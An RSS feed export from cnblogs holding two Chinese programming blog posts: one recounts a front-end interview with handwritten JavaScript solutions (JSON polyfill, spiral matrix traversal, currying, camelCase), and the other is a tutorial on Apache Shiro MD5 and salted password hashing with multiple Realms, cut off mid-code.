<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>头条二面 - 书生小龙</title>
<link>http://www.cnblogs.com/QH-Jimmy/p/9986821.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/QH-Jimmy/p/9986821.html</guid>
<description>&lt;p&gt;　　还是要diss一下周六的平安总部面试，面试体验渣到极点，以至于我已经在心里把所有平安职位拉黑。&lt;/p&gt;
&lt;p&gt;　　二面直接放点题目吧，作为记录，所有题目都需要现场手写，痛苦。&lt;/p&gt;

&lt;p&gt;　　自我介绍的时候，面试官问了下有什么东西特别有成就感，我就说原生实现了Datepicker的插件，然后就开始特别细节的问。&lt;/p&gt;
&lt;p&gt;　　源代码比较长，贴个地址吧：https://github.com/pflhm2005/JS-components/blob/master/vanilla-picker/index.js&lt;/p&gt;
&lt;p&gt;　　这一块问了比较久，因为完全是自己写的，所以全部都能答出来。&lt;/p&gt;
&lt;p&gt;　　接下里是现场出题。&lt;/p&gt;

&lt;p&gt;1、实现JSON.stringify的polyfill&lt;/p&gt;
&lt;p&gt;　　想了老久，手写很痛苦，就讲思路了。&lt;/p&gt;
&lt;p&gt;　　普通类型略，复杂类型根据对象、数组做遍历，然后用'{'、'}'、'['、']'字符进行拼接，中间涉及到null、undefined，直接跳过。&lt;/p&gt;
&lt;p&gt;　　还有一个循环引用的问题，需要直接报错，问题是如何判断存在循环引用，这里贴一个自己写的深拷贝代码，里面有处理循环引用的思路：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
const deepClone = (o) =&amp;gt;&lt;span&gt; {
  let path &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; WeakMap();
  path.set(o, &lt;/span&gt;'this'&lt;span&gt;);
  let path_ar &lt;/span&gt;= ['this'&lt;span&gt;];
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (&lt;span&gt;function&lt;/span&gt;&lt;span&gt; inner(o) {
    let result &lt;/span&gt;=&lt;span&gt; {};
    Object.keys(o).forEach(v &lt;/span&gt;=&amp;gt;&lt;span&gt; {
      let value &lt;/span&gt;=&lt;span&gt; o[v];
      path_ar.push(v);
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(value &amp;amp;&amp;amp; &lt;span&gt;typeof&lt;/span&gt; value === 'object'&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (path.has(value)) {
          let dupi_path &lt;/span&gt;= path.get(value).split('.').slice(1&lt;span&gt;);
          let origin &lt;/span&gt;=&lt;span&gt; result;
          dupi_path.forEach(v &lt;/span&gt;=&amp;gt;&lt;span&gt; {
            origin &lt;/span&gt;=&lt;span&gt; origin[v];
          });
          result[v] &lt;/span&gt;=&lt;span&gt; origin;
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
          path.set(value, path_ar.join(&lt;/span&gt;'.'&lt;span&gt;));
          result[v] &lt;/span&gt;=&lt;span&gt; inner(value);
        }
      } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        result[v] &lt;/span&gt;=&lt;span&gt; value;
      }
      path_ar.pop();
    });
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; result;
  })(o);
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　因为拿深拷贝的循环引用处理讲的，面试官就问我这个深拷贝后的对象，循环引用还指向之前的么，我就回答新对象中所有属性跟老的完全无关。&lt;/p&gt;

&lt;p&gt;2、嵌套数组的环形遍历&lt;/p&gt;
&lt;p&gt;　　这个题目有点意思，直接上图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/858904/201811/858904-20181120003915881-914708519.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　比如说上面这个二维数组，可以理解成一个矩阵，然后遍历方式如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/858904/201811/858904-20181120004023249-1229296515.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　一圈圈从外向内遍历，当然题目是m*n的矩阵。&lt;/p&gt;
&lt;p&gt;　　一开始看到题目感觉也挺新鲜，细写发现好恶心，变量用不过来，就简单讲了下思路，大概是设定一个遍历规则，然后遍历的初始和终止条件，嵌套for循环搞定。&lt;/p&gt;
&lt;p&gt;　　回家后写了下，代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
let iterator = (ar) =&amp;gt;&lt;span&gt; {
  let m &lt;/span&gt;=&lt;span&gt; ar.length;
  let n &lt;/span&gt;= ar[0&lt;span&gt;].length;
  &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i = 0,j = n;i !== j;i++,j--,m--&lt;span&gt;) {
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i2=i;i2&amp;lt;j;i2++&lt;span&gt;) {
      console.log(ar[i][i2]);
    }
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i3=i+1;i3&amp;lt;m;i3++&lt;span&gt;) {
      console.log(ar[i3][m&lt;/span&gt;-1&lt;span&gt;]);
    }
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i4=j-1;i4&amp;gt;i;i4--&lt;span&gt;) {
      console.log(ar[m&lt;/span&gt;-1][i4-1&lt;span&gt;]);
    }
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i5=m-2;i5&amp;gt;i;i5--&lt;span&gt;) {
      console.log(ar[i5][i])
    }
  }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这TM现场手写，怕是要疯了。&lt;/p&gt;

&lt;p&gt;3、sum(1,2).value()、sum(1)(2).value()均返回3&lt;/p&gt;
&lt;p&gt;　　这里一眼就看出来是函数柯里化，但是下手的时候很懵逼。&lt;/p&gt;
&lt;p&gt;　　想了好久好久，面试官都有点看不下去了，最后写出来了（完整手写出来，真的不容易啊）：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; sum(...args){
  let n &lt;/span&gt;= args.reduce((a,b) =&amp;gt; a+b, 0&lt;span&gt;);
  &lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; inner(...args2){
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; sum.apply(&lt;span&gt;null&lt;/span&gt;&lt;span&gt;, [n, ...args2]);
  }
  inner.value &lt;/span&gt;= () =&amp;gt;&lt;span&gt; { console.log(n); };
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; inner;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　面试官看了会，说写的倒不错，但是内部函数每次都会创建一个闭包，有没有优化的办法。&lt;/p&gt;
&lt;p&gt;　　我一脸痛苦的看了他一眼，他想了想说算了。&lt;/p&gt;

&lt;p&gt;4、字符串驼峰化&lt;/p&gt;
&lt;p&gt;　　简单讲就是aa-bb =&amp;gt; aaBb，aa--bb =&amp;gt; aaBb。&lt;/p&gt;
&lt;p&gt;　　先是简单的版本：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; camel(str) {
  let ar &lt;/span&gt;= str.split('-'&lt;span&gt;);
  let result &lt;/span&gt;=&lt;span&gt; [];
  let l &lt;/span&gt;=&lt;span&gt; ar.length;
  &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i = 1;i &amp;lt; l;i++&lt;span&gt;) {
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(!ar[i]) &lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
    result.push(ar[i][&lt;/span&gt;0].toUpperCase() + ar[i].slice(1&lt;span&gt;));
  }
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; ar[0] + result.join(''&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　然后面试官说，可能分隔符有多种，比如说_、@等等，然后函数不变，仍然只能传一个参数。&lt;/p&gt;
&lt;p&gt;　　我说这得重写，我的第一行就不管用了。&lt;/p&gt;
&lt;p&gt;　　面试官让讲思路，我就简单说直接遍历，设一个flag，标记是否遇到了分隔符，然后把分隔符后面的第一个非分隔符大写。&lt;/p&gt;
&lt;p&gt;　　回家后，代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 假设分隔符有_和-两种&lt;/span&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; camel(str) {
  let cut &lt;/span&gt;= ['_', '-'&lt;span&gt;];
  let ar &lt;/span&gt;= str.split(''&lt;span&gt;);
  let l &lt;/span&gt;=&lt;span&gt; ar.length;
  let flag &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i = 0;i &amp;lt; l;i++&lt;span&gt;) {
    let cur &lt;/span&gt;=&lt;span&gt; ar[i];
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(cut.indexOf(cur) !== -1&lt;span&gt;) {
      ar[i] &lt;/span&gt;= ''&lt;span&gt;;
      flag &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt;(flag){
      ar[i] &lt;/span&gt;=&lt;span&gt; ar[i].toUpperCase();
      flag &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    }
  }
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; ar.join(''&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　后面就问了一些工程化的问题，我一个人都不会，果然还是太年轻。&lt;/p&gt;
</description>
<pubDate>Mon, 19 Nov 2018 17:24:00 +0000</pubDate>
<dc:creator>书生小龙</dc:creator>
<og:description>还是要diss一下周六的平安总部面试，面试体验渣到极点，以至于我已经在心里把所有平安职位拉黑。 二面直接放点题目吧，作为记录，所有题目都需要现场手写，痛苦。 自我介绍的时候，面试官问了下有什么东西特别</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/QH-Jimmy/p/9986821.html</dc:identifier>
</item>
<item>
<title>shiro密码的比对，密码的MD5加密，MD5盐值加密，多个Relme - MrChengs</title>
<link>http://www.cnblogs.com/Mrchengs/p/9986798.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Mrchengs/p/9986798.html</guid>
<description>&lt;p&gt;&lt;span&gt;有具体问题的可以参考之前的关于shiro的博文，关于shiro的博文均是一次工程的内容&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;密码的比对&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;通过AuthenticatingRealm的CredentialsMatcher方法&lt;/p&gt;
&lt;p&gt;密码的加密，主要是在CredentialsMatcher的....&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1488757/201811/1488757-20181120002822338-1637490915.png&quot; alt=&quot;&quot; width=&quot;530&quot; height=&quot;269&quot;/&gt;&lt;/p&gt;



&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;密码的MD5加密&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;数据表中保存的密码，不应该是明文的，而且不能反推得到密码&lt;/p&gt;

&lt;p&gt;1.如何把一个字符串加密成MD5&lt;/p&gt;
&lt;p&gt; 使用其提供的接口实现&lt;/p&gt;

&lt;p&gt;2.替换当前的Realm的CredentialsMatcher属性，直接使用HashedCredentialsMatcher对象，&lt;/p&gt;
&lt;p&gt;并且设置加密算法&lt;/p&gt;
&lt;p&gt;applicatonContext.xml文件中&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
    &amp;lt;!--
            &lt;span&gt;3&lt;/span&gt;&lt;span&gt;.配置Realm
            &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;.1直接实现Realm接口的bean
          &lt;/span&gt;--&amp;gt;
    &amp;lt;bean id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;jdbcRealm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  &lt;span&gt;class&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;com.MrChengs.shiro.realms.ShiroRealm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
        &amp;lt;property name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;credentialsMatcher&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
            &amp;lt;bean  &lt;span&gt;class&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;strong&gt;&lt;span&gt;org.apache.shiro.authc.credential.HashedCredentialsMatcher&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
                 
                 &amp;lt;!-- 加密的方法 --&amp;gt;
                 &amp;lt;property name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hashAlgorithmName&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  value=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MD5&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/property&amp;gt;
                 
                 &amp;lt;!-- 指定加密的次数 --&amp;gt;
                 &amp;lt;property name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hashIterations&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  value=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/property&amp;gt;
            &amp;lt;/bean&amp;gt;
        &amp;lt;/property&amp;gt;
        
    &amp;lt;/bean&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看源码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; SimpleHash(String algorithmName, Object source, Object  salt, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; hashIterations)
            throws CodecException, UnknownAlgorithmException {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;StringUtils.hasText(algorithmName)) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; NullPointerException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;algorithmName  argument cannot be null or empty.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        }
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.algorithmName =&lt;span&gt; algorithmName;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.iterations =&lt;span&gt; Math.max(DEFAULT_ITERATIONS,  hashIterations);
        ByteSource saltBytes &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (salt != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            saltBytes &lt;/span&gt;=&lt;span&gt; convertSaltToBytes(salt);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.salt =&lt;span&gt; saltBytes;
        }
        ByteSource sourceBytes &lt;/span&gt;=&lt;span&gt; convertSourceToBytes(source);
        hash(sourceBytes, saltBytes, hashIterations);
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;测试加密：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
           String hash&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MD5&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
           Object cred &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;123456&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
           Object salt &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; hashInter = &lt;span&gt;1024&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;加密的类&lt;/span&gt;
           System.&lt;span&gt;out&lt;/span&gt;.println(&lt;span&gt;new&lt;/span&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt; SimpleHash&lt;/span&gt;&lt;/strong&gt;(hash, cred, salt,  hashInter));
     }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
fc1709d0a95a6be30bc5926fdb7f22f4
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;MD5盐值加密&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;假设两个人原始密码一致,这样也会更加安全&lt;/p&gt;
&lt;p&gt;所以此时需要使用到盐值&lt;/p&gt;

&lt;p&gt;步骤：&lt;/p&gt;
&lt;p&gt;在&lt;strong&gt;&lt;span&gt;doGetAuthenticationInfo&lt;/span&gt;&lt;/strong&gt;的方法返回值创建&lt;strong&gt;&lt;span&gt;SimpleAuthenticationInfo&lt;/span&gt;&lt;/strong&gt;对象的时候&lt;/p&gt;
&lt;p&gt;使用&lt;span&gt;SimpleAuthenticationInfo(principal, credentials, credentialsSalt, realmName);&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　　　　　//&lt;/span&gt;&lt;span&gt;盐值&lt;/span&gt;
           ByteSource credentialsSalt =  ByteSource.Util.bytes(username);
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;使用ByteSource.Util.bytes（）来计算盐值&lt;/p&gt;
&lt;p&gt;盐值需要唯一一般使用随机字符串或userid&lt;/p&gt;
&lt;p&gt;使用     &lt;strong&gt;&lt;span&gt;new SimpleHash(algorithmName, source, salt, hashIterations)&lt;/span&gt;&lt;/strong&gt;计算盐值解密后的盐值&lt;/p&gt;

&lt;p&gt;此时放置的不在是明文的密码&lt;/p&gt;
&lt;p&gt;ShiroRealm.java&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;//&lt;/span&gt;&lt;span&gt;6.根据用户的情况来构建AuthenticationInfo并且返回
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;以下信息是从数据库中获取的
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;principal：认证的实体信息，可以是username，也可以是数据表对应的实体对象&lt;/span&gt;
           Object principal =&lt;span&gt; username;
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;credentials:密码&lt;/span&gt;
           &lt;strong&gt;&lt;span&gt;Object credentials = null;
           if(&quot;user&quot;.equals(username)){
                //计算后user密码为123456的盐值
                credentials =  &quot;2044dc18864ca3bc408359a0fb13c2a7&quot;;
           }else if(&quot;admin&quot;.equals(username)){
                //计算和admin密码为123456的盐值
                credentials =  &quot;&lt;/span&gt;&lt;span&gt;30beaf2a87d54ebe889cfccc076247ad&lt;/span&gt;&lt;span&gt;&lt;span&gt;&quot;;
          &lt;/span&gt;&lt;/span&gt;&lt;span&gt; }
          &lt;/span&gt; 
           &lt;/strong&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;realmName:当前realm对象为name，调用父类的getName()方法即可&lt;/span&gt;
           String realmName =&lt;span&gt; getName();
           
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;盐值&lt;/span&gt;
          &lt;strong&gt;&lt;span&gt; ByteSource credentialsSalt =&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;  ByteSource.Util.bytes(username);&lt;/span&gt;&lt;/strong&gt;
          
           &lt;span&gt;SimpleAuthenticationInfo&lt;/span&gt; info &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;new  SimpleAuthenticationInfo(principal, credentials, realmName);&lt;/span&gt;
           info = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleAuthenticationInfo(principal,  credentials, credentialsSalt, realmName);
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; info;
     }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;盐值的计算：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
           String hash&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MD5&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
           Object cred &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;123456&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
           Object salt &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;admin&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; hashInter = &lt;span&gt;20&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;加密的类&lt;/span&gt;
           System.&lt;span&gt;out&lt;/span&gt;.println(&lt;span&gt;&lt;strong&gt;new&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;&lt;strong&gt; SimpleHash(hash, cred, salt,  hashInter)&lt;/strong&gt;&lt;/span&gt;);
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;new SimpleHash(algorithmName, source, salt,  hashIterations)&lt;/span&gt;
     }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;在测试中，只有用户名为user/admin 密码为123456才能成功登陆&lt;/p&gt;


&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt; 多Realm&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 创建新的类&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1488757/201811/1488757-20181120004304397-1031133289.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; SecondRealm。java&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; SecondRealm extends AuthenticatingRealm {
     @Override
     &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; AuthenticationInfo  doGetAuthenticationInfo(AuthenticationToken arg0) throws  AuthenticationException {
           System.&lt;/span&gt;&lt;span&gt;out&lt;/span&gt;.println(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SecondRealm--&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
           
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;1.把AuthenticationToken转为UsernamePasswordToken&lt;/span&gt;
           UsernamePasswordToken  upToken =&lt;span&gt;  (UsernamePasswordToken) arg0;
           
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;2.从UsernamePasswordToken获取username&lt;/span&gt;
           String username =&lt;span&gt; upToken.getUsername();
           
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;3.调用数据库的方法，从数据库查询username对应的用户记录&lt;/span&gt;
           System.&lt;span&gt;out&lt;/span&gt;.println(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;从数据库中获取username：&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +&lt;span&gt;  username);
           
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;4.若用户不存在可以抛出异常 UnKnownAccountException异常&lt;/span&gt;
           &lt;span&gt;if&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unknow&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.equals(username)){
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; UnknownAccountException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;username 不存在&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
           }
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;5.根据用户信息的清空决定是否需要抛出其他的异常&lt;/span&gt;
           &lt;span&gt;if&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;monster&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.equals(username)){
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; LockedAccountException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;用户被锁定&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
           }
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;6.根据用户的情况来构建AuthenticationInfo并且返回
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;以下信息是从数据库中获取的
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;principal：认证的实体信息，可以是username，也可以是数据表对应的实体对象&lt;/span&gt;
           Object principal =&lt;span&gt; username;
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;credentials:密码&lt;/span&gt;
           Object credentials = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;user&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.equals(username)){
                credentials &lt;/span&gt;=  &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;6e3be0247455b9298f47eac8e57a07214ef84115&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
           }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;admin&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.equals(username)){
                credentials &lt;/span&gt;=  &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ff9633d047eaaf9861984ed86e5f73f904647716&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
           }
           
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;realmName:当前realm对象为name，调用父类的getName()方法即可&lt;/span&gt;
           String realmName =&lt;span&gt; getName();
           
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;盐值&lt;/span&gt;
